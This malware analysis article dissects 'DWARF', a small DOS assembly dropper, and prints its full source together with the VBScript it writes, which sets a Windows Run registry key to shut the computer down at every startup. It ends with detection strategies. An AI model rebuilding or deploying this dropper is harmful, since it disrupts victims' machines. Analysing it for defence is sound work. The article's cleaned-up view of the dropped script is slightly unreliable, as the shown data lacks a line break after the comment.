
**Malware Analysis: DWARF - A Simple VBScript Dropper**

This article analyzes a piece of assembly code that acts as a simple dropper, creating a VBScript file designed to shut down the victim's computer on startup. We'll break down the code's functionality step by step, highlighting key assembly instructions and the resulting VBScript.

**1. Initial Interaction and Choice (DEBUT to TOUCHE)**

```assembly
DEBUT :        mov ah,09h          ;affiche un message
              lea dx,text1         ;avec deux proposition
              int 21h

TOUCHE:       mov ah,1            ;lecture du caractère
              int 21h
              cmp al,'C'
              je CREER_FICHIER
              cmp al,'c'
              je CREER_FICHIER     ;si 'C-c' on continue
              cmp al,'Q'
              je FIN_PROGRAMME
              cmp al,'q'
              je FIN_PROGRAMME     ;si 'Z-z' on stop
              mov dx,offset bad   ;mauvaise touche
              mov ah,9h
              int 21h
              jmp TOUCHE

```

-   **`mov ah, 09h` / `lea dx, text1` / `int 21h`**: This sequence displays a prompt to the user. `int 21h` with `ah=09h` is a DOS interrupt to print a string. `lea dx, text1` loads the effective address of the `text1` string (defined later) into the `DX` register. The string asks the user to press 'C' to continue or 'Q' to quit.
-   **`mov ah, 1` / `int 21h`**: This reads a single character from the keyboard input. `int 21h` with `ah=1` waits for a keypress and stores the ASCII value in the `AL` register.
-   **`cmp al, 'C'` / `je CREER_FICHIER` (and similar comparisons)**: These lines compare the input character (`AL`) with 'C', 'c', 'Q', and 'q'. The `je` (Jump if Equal) instruction branches to the `CREER_FICHIER` label if the input is 'C' or 'c', and to `FIN_PROGRAMME` if it's 'Q' or 'q'.
-   **`mov dx, offset bad` / `mov ah, 9h` / `int 21h` / `jmp TOUCHE`**: If the input is not 'C', 'c', 'Q', or 'q', this section displays an "invalid input" message (the `bad` string) and then jumps back to `TOUCHE` to wait for another keypress.

**2. File Creation (CREER_FICHIER)**

```assembly
CREER_FICHIER: mov ah,3Ch          ;CREE UN FICHIER
              xor cx,cx
              mov dx,offset NOM    ;ET LUI DONNE UN NOM
              int 21h

```

-   **`mov ah, 3Ch` / `xor cx, cx` / `mov dx, offset NOM` / `int 21h`**: This is the core of the file creation process. `int 21h` with `ah=3Ch` is the DOS function to create a new file.
    -   `xor cx, cx`: Sets the file attributes to normal (CX = 0).
    -   `mov dx, offset NOM`: Loads the address of the filename string (`NOM`, defined later as "c:\dwarf.vbs") into `DX`.
    -   The `int 21h` call attempts to create the file. If successful, the file handle is returned in `AX`. If it fails (e.g., due to insufficient permissions), the carry flag (CF) will be set, and `AX` will contain an error code. _This code doesn't check for errors, which is a common characteristic of simple malware._

**3. Writing to the File (ECRIRE_FICHIER)**

```assembly
ECRIRE_FICHIER: xchg ax,bx
              mov ah,40h          ;ECRIT DANS LE FICHIER
              mov cx,meslen
              mov dx,offset note
              int 21h

```

-   **`xchg ax, bx`**: This instruction swaps the contents of the `AX` and `BX` registers. The file handle (returned by the `CREER_FICHIER` section) was in `AX`, and now it's moved to `BX`. This is because `int 21h` with `ah=40h` expects the file handle in `BX`.
-   **`mov ah, 40h` / `mov cx, meslen` / `mov dx, offset note` / `int 21h`**: This writes the malicious VBScript code to the newly created file.
    -   `mov ah, 40h`: Sets up `int 21h` for writing to a file.
    -   `mov cx, meslen`: `meslen` is calculated later using `equ $-note`, determining the length (in bytes) of the data to be written.
    -   `mov dx, offset note`: Loads the address of the data to be written (starting at the `note` label) into `DX`.
    -   `int 21h`: Performs the write operation. Again, error handling is absent.

**4. Closing the File (FERMER_FICHIER)**

```assembly
FERMER_FICHIER: mov ah,3Eh          ;PUIS LE REFERME
              int 21h

```

-   **`mov ah, 3Eh` / `int 21h`**: This closes the file. `int 21h` with `ah=3Eh` closes the file whose handle is in `BX`. Good practice, but crucial for ensuring the data is flushed to disk.

**5. Directory Change (Unnecessary)**

```assembly
              mov dx,offset updir   ;CHANGEMENT DE REPERTOIRE 
              mov ah,3Bh
              int 21h

```

-   **`mov dx, offset updir` / `mov ah, 3Bh` / `int 21h`**: This attempts to change the current directory to ".." (the parent directory). `int 21h` with `ah=3Bh` is used to change the directory. _This section appears unnecessary and might be leftover code from development or an attempt to obfuscate the malware's actions._ It doesn't affect the core functionality.

**6. Displaying a Message (MESSAGE)**

```assembly
MESSAGE:      mov ah,09h          ;AFFICHE LE MESSAGE
              lea dx,msg
              int 21h

```

-   **`mov ah, 09h` / `lea dx, msg` / `int 21h`**: This displays a final message to the user, informing them that a file named "c:\dwarf.vbs" has been added. This is similar to the initial message display.

**7. Program Termination (FIN_PROGRAMME)**

```assembly
FIN_PROGRAMME : mov ah,4Ch          ;FERME LE PROGRAMME
              int 21h

```

-   **`mov ah, 4Ch` / `int 21h`**: This terminates the assembly program. `int 21h` with `ah=4Ch` is the standard DOS exit function.

**8. Data Definitions**

```assembly
text1  db 10,13,'Tape C pour continuer ou Q pour quitter : $'
bad    db 7,7,8,' ',8,24h
NOM    db 'c:\dwarf.vbs',0
updir  db '..',0
msg    db 7,7,7,10,13,'SALUT MEC !!!!'
       db 10,10,13,'UN FICHIER A ETE RAJOUTE'
       db 10,13,'IL SE NOMME C:\dwarf.vbs $'
note   db 'rem DwArF.vbs by Panda '
       db '(c) 2000'
prog   db 'Dim WSHShell',0Dh,0Ah
       db 'Set WSHShell = Wscript.CreateObject("WScript.Shell")',0Dh,0Ah
       db 'WSHShell.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\'
       db 'Windows\CurrentVersion\Run\DwArF", "C:\WINDOWS\RUNDLL32.EXE '
       db 'C:\Windows\system\User.exe,ExitWindows"'

meslen equ $-note

end DEBUT

```

-   **`text1`, `bad`, `msg`**: These are the strings displayed to the user. `db` defines bytes. `10` and `13` are ASCII codes for line feed and carriage return, respectively. `$` is the string terminator for `int 21h, ah=09h`. `7` is the bell character (often makes a beep). `8` is backspace. `24h` is `$` in hexadecimal.
-   **`NOM`**: This is the filename of the VBScript file to be created: "c:\dwarf.vbs". The `0` is a null terminator, required for DOS strings.
-   **`updir`**: This is the string ".." used (unnecessarily) to attempt to change the directory.
-   **`note` and `prog`**: This is the _crucial part_ - the actual VBScript code that will be written to `c:\dwarf.vbs`.
-   **`meslen equ $-note`**: This calculates the length of the VBScript code. `$` represents the current address, and `note` is the starting address of the data. The difference is the length.

**9. The Dropped VBScript (The Payload)**

Let's examine the VBScript code that gets written to `c:\dwarf.vbs`:

```vbscript
rem DwArF.vbs by Panda (c) 2000
Dim WSHShell
Set WSHShell = Wscript.CreateObject("WScript.Shell")
WSHShell.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\DwArF", "C:\WINDOWS\RUNDLL32.EXE C:\Windows\system\User.exe,ExitWindows"

```

-   **`rem DwArF.vbs by Panda (c) 2000`**: This is a comment.
-   **`Dim WSHShell`**: Declares a variable to hold a WScript.Shell object.
-   **`Set WSHShell = Wscript.CreateObject("WScript.Shell")`**: Creates an instance of the `WScript.Shell` object. This object provides access to various system functionalities, including the registry.
-   **`WSHShell.Regwrite ...`**: This is the core of the malicious action. It uses the `Regwrite` method to create a new registry entry:
    -   **`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\DwArF`**: This is the registry key. The `Run` key under `CurrentVersion` is a standard location for programs that should be executed automatically when Windows starts. The malware creates a new value named `DwArF` under this key.
    -   **`"C:\WINDOWS\RUNDLL32.EXE C:\Windows\system\User.exe,ExitWindows"`**: This is the value assigned to the `DwArF` entry. It specifies the command that will be executed on startup.
        -   `RUNDLL32.EXE`: A Windows utility that can be used to execute functions within DLL files.
        -   `C:\Windows\system\User.exe,ExitWindows`: This attempts to call the `ExitWindows` function within `User.exe`. This function is likely intended to shut down or restart the computer. Note: The path might need to be adjusted depending on the specific Windows version (e.g., `C:\Windows\System32`). The use of `User.exe` is interesting, as it is a less commonly used executable compared to something like `shutdown.exe`. This might be an attempt to evade basic signature-based detection.

**Summary: Impact and Detection**

The assembly code acts as a dropper. It creates a VBScript file (`dwarf.vbs`) that, when executed, adds a registry entry to force the system to shut down or restart every time it boots.

**Detection Strategies:**

1.  **Signature-Based Detection:** Antivirus software can create signatures based on the assembly code itself or the generated VBScript.
2.  **Heuristic Analysis:** Behavioral analysis can detect the creation of the VBScript and the modification of the `Run` registry key. The unusual use of `User.exe` could also be a flag.
3.  **File System Monitoring:** Monitoring for the creation of files with `.vbs` extensions in unusual locations (like the root of the C: drive) can be an indicator.
4.  **Registry Monitoring:** Monitoring changes to the `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run` key is crucial for detecting this type of persistence mechanism.
5.  **Sandboxing:** Running the assembly code in a sandboxed environment would allow safe observation of its behavior, including the creation of the VBScript and its registry modifications.

This malware, while simple, demonstrates a common technique: using a small, easily-delivered dropper to establish persistence and execute a more impactful payload. The lack of error handling and the somewhat amateurish design choices (like the unnecessary directory change) are typical of older, less sophisticated malware.
